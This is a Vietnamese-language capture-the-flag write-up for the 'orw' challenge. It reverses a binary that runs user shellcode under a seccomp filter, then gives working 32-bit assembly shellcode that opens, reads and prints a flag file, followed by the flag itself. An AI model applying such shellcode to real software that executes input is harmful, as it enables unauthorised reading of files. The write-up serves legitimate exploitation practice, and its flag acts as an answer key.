# orw

# Reverse

Dùng IDA để đọc pseudo code
```sh
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```
Chương trình sẽ thực thi hàm orw_seccomp() để giới hạn lại các lệnh ngắt, dùng seccomp_tool để xem các lệnh có thể thực thi
```sh
thanhnt@THANGNT-ZIR:/mnt/c/Users/n18dc/OneDrive/Desktop/PaoTW/orw$ seccomp-tools dump ./orw
/var/lib/gems/2.5.0/gems/seccomp-tools-1.5.0/lib/seccomp-tools/dumper.rb:135: warning: Insecure world writable dir /mnt/c in PATH, mode 040777
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
Chương trình có thể thực thi 1 số chức năng như: read, write, open, exit...
Tiếp theo chương trình in ra đoạn text, sau đó nhập với đọ dài 0xc8 vào biến &shellcode và thực thi shellcode chúng ta vừa cung cấp.
Bên cạnh đó đường dẫn flag đã được cung cấp
`Read the flag from /home/orw/flag`

# Exploit

Thiết kế 1 shellcode 32-bit gồm 3 chức năng open, read, write như sau:
```sh
// open file ở /home/orw/flag
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov eax,0x5 
mov ebx,esp
xor edx,edx
xor ecx,ecx
int 0x80
// read 
sub esp,100
mov ebx,eax
mov eax,0x3
mov ecx,esp
mov edx,100
int 0x80
// write 
mov eax,0x4
mov ebx,1
mov ecx, esp
mov edx,100
int 0x80
```

Chuyển đoạn trên thành shellcode, mình sử dụng trang `https://defuse.ca` để convert thành shellcode.
## FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}